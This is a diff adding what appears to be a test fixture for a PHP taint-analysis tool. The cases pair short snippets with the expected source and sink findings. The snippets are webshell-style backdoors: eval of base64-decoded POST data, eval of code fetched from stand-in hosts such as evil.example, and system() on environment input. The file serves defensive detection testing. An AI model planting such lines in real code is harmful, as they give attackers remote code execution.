@@ -1,0 +1,74 @@
+INPUT
+eval(base64_decode($_POST['x']));
+OUTPUT
+eval(base64_decode($_POST['x']));
+ANALYSIS
+sources:
+  auto-exec  line 3  $_POST['x']
+sinks:
+  auto-exec  obfusc  line 3  base64_decode (tainted by $_POST)
+  auto-exec  code_exec  line 3  eval (tainted by $_POST)
+INPUT
+$code = file_get_contents('http://evil.example/p.txt');
+eval($code);
+OUTPUT
+$code = file_get_contents('http://evil.example/p.txt');
+eval($code);
+ANALYSIS
+sources:
+sinks:
+  auto-exec  code_exec  line 4  eval (tainted by remote URL)
+INPUT
+eval(strrev(file_get_contents('https://pastebin.example/raw/abc')));
+OUTPUT
+eval(strrev(file_get_contents('https://pastebin.example/raw/abc')));
+ANALYSIS
+sources:
+sinks:
+  auto-exec  code_exec  line 3  eval (tainted by remote URL)
+INPUT
+$k = $_SERVER['HTTP_USER_AGENT'];
+$p = decode($data, $k);
+eval($p);
+OUTPUT
+$k = $_SERVER['HTTP_USER_AGENT'];
+$p = decode($data, $k);
+eval($p);
+ANALYSIS
+sources:
+  auto-exec  line 3  $_SERVER['HTTP_USER_AGENT']
+sinks:
+  auto-exec  code_exec  line 5  eval (tainted by $_SERVER)
+INPUT
+$cmd = getenv('CMD');
+system($cmd);
+OUTPUT
+$cmd = getenv('CMD');
+system($cmd);
+ANALYSIS
+sources:
+sinks:
+  auto-exec  os_exec  line 4  system (tainted by getenv())
+INPUT
+$raw = file_get_contents('php://input');
+$fn = $raw;
+$fn();
+OUTPUT
+$raw = file_get_contents('php://input');
+$fn = $raw;
+$fn();
+ANALYSIS
+sources:
+  auto-exec  line 3  file_get_contents('php://input')
+sinks:
+  auto-exec  dispatch  line 5  $variable() (variable function; tainted by request body (php://input))
+INPUT
+$safe = "ls";
+system($safe);
+OUTPUT
+$safe = "ls";
+system($safe);
+ANALYSIS
+sources:
+sinks:
+  auto-exec  os_exec  line 4  system
